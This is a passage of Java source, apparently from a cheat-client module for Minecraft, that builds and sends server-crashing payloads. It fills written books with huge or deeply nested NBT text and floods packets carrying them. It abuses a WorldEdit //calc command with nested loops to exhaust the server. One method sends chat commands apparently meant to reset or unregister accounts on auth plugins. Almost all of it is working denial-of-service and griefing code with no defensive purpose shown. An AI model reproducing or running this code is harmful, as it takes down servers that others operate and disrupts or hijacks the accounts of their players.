xtra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
            }

            comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
            comp.setString("title", "onePlaceHandCrasherBookEdit");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);
            ItemStack stack = new ItemStack(Items.writable_book);
            stack.setTagCompound(comp);
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeItemStackToBuffer(stack);
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0D, Minecraft.getMinecraft().thePlayer.posZ), 1, stack, 0.0F, 0.0F, 0.0F));
        }
    }

    public void newcrashb() {
        try {
            final ItemStack book = new ItemStack(Items.writable_book);
            final String author = Minecraft.getMinecraft().getSession().getUsername();
            final String title = "Play with me.";
            final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            final NBTTagCompound tag = new NBTTagCompound();
            final NBTTagList list = new NBTTagList();
            for (int i2 = 0; i2 < 16; ++i2) {
                final String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                final NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                list.appendTag(tString);
            }
            tag.setString("author", author);
            tag.setString("title", "Play with me.");
            tag.setTag("pages", list);
            book.setTagInfo("pages", list);
            book.setTagCompound(tag);

            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));


        } catch (Exception ex) {
            PlayerUtils.sendMessage("Crash Fail...");
        }
    }

    public void Worledit() {
        if (TimeHelper.hasReached(1000)) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
        }
    }

    public void Zerosmash() {
        final ItemStack book = new ItemStack(Items.writable_book);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = Minecraft.getMinecraft().getSession().getUsername();
        final String title = "PlaceBookCrasher";
        final String size = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
        for (int i = 0; i < 50; ++i) {
            final NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        book.setTagInfo("pages", list);
        book.setTagCompound(tag);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
    }

    public static long Random(double min, double max) {
        return (long) ((Math.random() * (1000 / min - 1000 / max + 1)) + 1000 / max);
    }

    public void AuthmeCrash() {
        if (TimeHelper.hasReached(500)) {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("Team4Griefers"));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/cp unregister"));
        }
    }

    public void Packetflood() {
        try {
            final ItemStack bookObj = new ItemStack(Items.writable_book);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tag = new NBTTagCompound();
            final String author = Minecraft.getMinecraft().getSession().getUsername();
            final String title = "ClickCrasher";
            final String size = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
            for (int i = 0; i < 50; ++i) {
                final String siteContent = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
                final NBTTagString tString = new NBTTagString("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789");
                list.appendTag(tString);
            }
            tag.setString("author", author);
            tag.setString("title", "ClickCrasher");
            tag.setTag("pages", list);
            bookObj.setTagInfo("pages", list);
            bookObj.setTagCompound(tag);
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, bookObj, (short) 0));
        } catch (Exception var10) {
            var10.printStackTrace();
        }
    }
 public void Custombyte() {
     ItemStack book = new ItemStack(Items.writable_book);
     NBTTagList l = new NBTTagList();

     for (int i = 0; i < 32766; ++i) {
         l.appendTag(new NBTTagString("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745�36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789"));
     }

     NBTTagCompound tag = new NBTTagCompound();
     tag.setTag("pages", l);
     book.setTagCompound(tag);

     for (int packets = 0; packets < 100; ++packets) {
         Minecraft.getMinecraft().getNetHandler().getNetworkManager().channel.writeAndFlush(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
     }
      toggle();
 }
 public void MinePlex() {
     for (int c = 0; c < 30; ++c) {
         NBTTagCompound comp = new NBTTagCompound();
         NBTTagList list = new NBTTagList();

         for (int i = 0; i < 2; ++i) {
             list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[